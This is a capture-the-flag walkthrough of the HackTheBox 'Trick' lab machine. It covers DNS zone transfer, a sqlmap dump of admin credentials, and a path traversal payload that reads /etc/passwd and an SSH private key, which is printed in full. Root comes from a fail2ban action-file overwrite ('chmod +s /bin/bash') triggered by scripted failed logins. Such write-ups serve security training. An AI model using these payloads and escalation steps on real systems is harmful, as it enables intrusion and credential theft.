---
title: "Trick Machine"
date: 2022-10-29T00:00:00Z
draft: false
TableOfContents: true
---


## About the machine

{{< figure src="../../images/trick.png" title="Trick Machine Banner" width="600" >}}



| data |  |
|--------| ------- |
| Machine | Trick |
| Platform | Hackthebox |
| url | [link](https://app.hackthebox.com/machines/Trick) |
| creator | [Geiseric](https://app.hackthebox.com/users/184611) |
| OS | Linux |
| Release data | 18 June 2022 |
| Difficulty | Easy |
| Points | 20 |
| ip | 10.10.11.166 |





### Recon

First, we run:

```bash
export ip=10.10.11.166
```


#### Service/ Port enumeration

Run nmap to enumerate open ports, services, OS and traceroute

General enumeration not to make too much noise:

```bash
sudo nmap $ip -Pn
```

Results:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:31 EDT
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

Once you know open ports, run nmap to see service versions and more details:   

```bash
nmap -sCV -p22,80,53,25 -oN targeted $ip
```

Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


#### Directory enumeration

We can use gobuster to enumerate directories:

```bash
gobuster dir -u $ip -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

#### dns enumeration

Run:

```bash
dnslookup
```

And after that:

```
> SERVER 10.10.11.166
```

Results:

```
Default server: 10.10.11.166
Address: 10.10.11.166#53
```

Then, we run:

```
> 10.10.11.166
```

And as a result, we have:

```
166.11.10.10.in-addr.arpa       name = trick.htb.
```

Now we have a dns name: trick.htb. We can dig it with:

```bash
dig trick.htb axfr @10.10.11.166
```

And the results:

```
; <<>> DiG 9.18.6-2-Debian <<>> trick.htb axfr @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 96 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Wed Oct 19 13:20:24 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

Finally we have these dns domains:
+ trick.htb
+ preprod-payroll.trick.htb
+ root.trick.htb


### Edit /etc/hosts file

We add the given subdomain to our /etc/hosts file.
First we open the /etc/hosts file with an editor. For instance, nano.

```bash
sudo nano /etc/hosts
```
We move the cursor to the end and we add these lines:

```
10.10.11.166	trick.htb
10.10.11.166	preprod-payroll.trick.htb
10.10.11.166	root.trick.htb
```

Now we can use the browser to go to: http://preprod-payroll.trick.htb

And start again with directory enumeration.

#### Directory enumeration

Run the dictionary:

```bash
gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Results:

```
Dirs found with a 302 response:

/

Dirs found with a 403 response:

/assets/
/database/
/assets/vendor/
/assets/img/
/assets/vendor/jquery/
/assets/DataTables/
/assets/vendor/bootstrap/
/assets/vendor/bootstrap/js/
/assets/vendor/jquery.easing/
/assets/css/
/assets/vendor/php-email-form/
/assets/vendor/venobox/
/assets/vendor/waypoints/
/assets/vendor/counterup/
/assets/vendor/owl.carousel/
/assets/vendor/bootstrap-datepicker/
/assets/vendor/bootstrap-datepicker/js/
/assets/js/
/assets/font-awesome/
/assets/font-awesome/js/
/assets/vendor/owl.carousel/assets/
/assets/vendor/bootstrap/css/
/assets/vendor/bootstrap-datepicker/css/
/assets/font-awesome/css/
/assets/vendor/bootstrap-datepicker/locales/
/assets/font-awesome/less/


--------------------------------
Files found during testing:

Files found with a 302 responce:

/index.php

Files found with a 200 responce:

/login.php
/home.php
/header.php
/users.php
/ajax.php
/navbar.php
/assets/vendor/jquery/jquery.min.js
/assets/DataTables/datatables.min.js
/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
/assets/vendor/jquery.easing/jquery.easing.min.js
/assets/vendor/php-email-form/validate.js
/assets/vendor/venobox/venobox.min.js
/assets/vendor/waypoints/jquery.waypoints.min.js
/assets/vendor/counterup/counterup.min.js
/assets/vendor/owl.carousel/owl.carousel.min.js
/assets/js/select2.min.js
/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js
/assets/js/jquery.datetimepicker.full.min.js
/assets/js/jquery-te-1.4.0.min.js
/assets/font-awesome/js/all.min.js
/department.php
/topbar.php
/position.php
/employee.php
/payroll.php
```

In http://preprod-payroll.trick.htb/users.php there is this info:

```
name: Administrator
username: Enemigosss
```


### Exploiting a sql injection vulnerability

If we have a look at the forms at http://preprod-payroll.trick.htb/login.php and run sqlmap, we'll see that it is vulnerable to SQL injection - Blind.

We can extract databases:

```bash
sqlmap -r login --dbs
```

Results:

```
available databases [2]:
[*] information_schema
[*] payroll_db
```

Now, we extract tables from payroll_db database:

```bash
sqlmap -r login -D payroll_db --tables
```

Results:

```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

Next, we get columns from the users table:

```bash
sqlmap -r login -D payroll_db -T users --columns
```

Results:

```
Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| name      | varchar(200) |
| password  | varchar(200) |
| type      | tinyint(1)   |
| username  | varchar(100) |
+-----------+--------------+
```

And finally we can get usernames and passwords:

```bash
sqlmap -r login -D payroll_db -T users -C username,password --dump
```

Results:

```
Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+
```

We can login at http://preprod-payroll.trick.htb and see an administration pannel, but other than information disclosure, we cannot find a vuln to get into the server.


#### DNS fuzzing

Since the subdomain name (http://preprod-payroll.trick.htb/) looks interesting as “payroll” can be replaced with another word, we can consider fuzzing it. Firstly, we will need to figure out the non-existence subdomain query’s error response size. Then we fuzz for a subdomain.

```bash
curl -s -H "Host: nonexistent.trick.htb" https://trick.htb | wc -c
```

And it returns 5480, which is the filter that we will use in th ffuz command.

Now we can keep on enumerating subdomains with ffuz:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt -u http://trick.htb -H “Host: FUZZ.trick.htb” -fs 5480
```

If we add -fs 5480 to the command this will filter out the responses that are 5480 bytes in length (which are non-existent subdomains) and we can pinpoint what is a real finding.

```bash
ffuf -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.166 -fs 5480
```

Adding the filter reveals a new subdomain called preprod-marketing. Results:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.166
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 267ms]
pc169                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 116ms]
77msccom                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms
```


### Edit /etc/hosts file

We add the given subdomain to our /etc/hosts file.
First we open the /etc/hosts file with an editor. For instance, nano.

```bash
sudo nano /etc/hosts
```

We move the cursor to the end and we add these lines:

```
10.10.11.166	preprod-marketing.trick.htb
```

We introduce the address into the browser and we can see a website. In one of the pages there is a path traversal vulnerability:

```
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd
```

Results:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Now, we can infer somehow that in /home/michael we can find a .ssh folder with teh id_rsa public ssh signature. To download it, we can use burp and capture this petition:

```
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
```

As a result, we can download michael's public key to login via ssh:

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 20 Oct 2022 08:25:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1823

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Now we save it with the name we want and change its permissions:

```bash
nano key
# CTRl-MAY V to paste it
# CTRL-X, Yes and ENTER to save the buffer and exit
sudo chmod 400 key
```

And we can login as michael:

```bash
ssh -i key michael@10.10.11.166
```

In /home/michael we have the user flag: user.txt.


### Escalation of privileges

Getting the system flag.
Check michael's groups:

```bash
id
```

Results:

```
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Check michael's permissions:

```bash
sudo -l
```

Results:

```
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Interesting part here is that michael may run fail2ban command as root without any password. This is due to a misconfiguration and we can exploit it.

For starters, michael has writing permissions over the configuration files located in /etc/fail2ban/action.d

Run:

```bash
ls -la /etc/fail2ban
```

And we can see michael, as part of the security group has rwx rights on the directory owned by root:

```
...
drwxrwx---   2 root security  4096 Oct 20 11:03 action.d
...
```

Now we need to understand what fail2ban is and how it works. fail2ban is a great IDPS tool, not only it can detect attacks but also block malicious IP addresses by using Linux iptables. Although fail2ban can be used for services like HTTP, SMTP, IMAP, etc. most sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for a certain period of time or maybe forever.


In the file /etc/fail2ban/jail.conf, we can spot some customizations such as ban time and maxretry:

```bash
cat /etc/fail2ban/jail.conf
```

And we see that bantime is limited to 10 seconds and maximum of retries to 5:

```
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host gets banned.
maxretry = 5
```

This means that if we retry ssh connection six times (so we exceed the maxretry parameter), the file  /etc/fail2ban/action.d/iptables-multiport.conf will be executed as root, and as a consequence, our host will be banned. Now, as part of the security group michael does have rwx permissions on the parent folder /etc/fail2ban/action.d, but not on the file /etc/fail2ban/action.d/iptables-multiport.conf:

```bash
ls -la /etc/fail2ban/action.d/iptables-multiport.conf
```

Result:

```
-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf
```

We need then, to be able to edit that file to include our malicious code. As the service fail2ban is restarted every minute or so, you need to execute the following commands quickly. They will allow you to overwrite the file /etc/fail2ban/action.d/iptables-multiport.conf:

```bash
# create a copy of the file to have rwx permissions
mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
# overwrite the existing file with your copy
cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
# edit the file and add your lines
nano /etc/fail2ban/action.d/iptables-multiport.conf
# In the file, comment the line with the  actionban definition and
# add:
# actionban = chmod +s /bin/bash
# Also in the file, comment the line with the  actionunban definition and
# add:
# actionunban = chmod +s /bin/bash
# CTRL-X -   Yes and ENTER to save changes.
```

With "chmod +s /bin/bash" we're going to give the suid bit to bash. The suid bit provides the user running it the same privileges that the user who created it. In this case, root is the user who created it. If we run it, we'll have root privileges during its execution.
The next step is restarting the service to get the file iptables-multiport.conf updated.

```bash
sudo /etc/init.d/fail2ban restart
```

Now, when we fail to login into the system with ssh more than 5 times, the configuration set in iptables-multiport.conf will take place. For that, from the attacker command line:

1. We install sshpass, a program that allows us to pass passwords in the command line to ssh. This way we can automate the login process:

```bash
sudo apt install sshpass
```

2. Write a script in the attacker machine:

```bash
nano wronglogin.sh
```

```bash
#!/bin/bash

sshpass -p "wrongpassword" ssh michael@10.10.11.166
sshpass -p "wrongpassword" ssh michael@10.10.11.166
sshpass -p "wrongpassword" ssh michael@10.10.11.166
sshpass -p "wrongpassword" ssh michael@10.10.11.166
sshpass -p "wrongpassword" ssh michael@10.10.11.166
sshpass -p "wrongpassword" ssh michael@10.10.11.166
```

Add execution permission:

```bash
chmod +x wronglongin.sh
```

3. Launch the script:

```bash
./wronglogin.sh
```


Once the script is executed, the suid bit will be activated for bash. Run:

```bash
 ls -l /bin/bash
```

And you will see:

```
-rwsr-sr-x 1 root root 1168776 Oct 20  2022 /bin/bash
```

Now if we run:

```bash
bash -p
```

The -p flag turns on privileged mode.  In this mode, the `$BASH_ENV' and '$ENV' files are not processed, shell functions are not inherited from the environment, and the `SHELLOPTS', 'BASHOPTS', 'CDPATH' and 'GLOBIGNORE' variables, if they appear in the environment, are ignored. The result:

```
michael@trick:~$ bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
bash-5.0# cd /root
bash-5.0# ls
f2b.sh  fail2ban  root.txt  set_dns.sh
```

To display the system flag:

```bash
cat root.txt
```



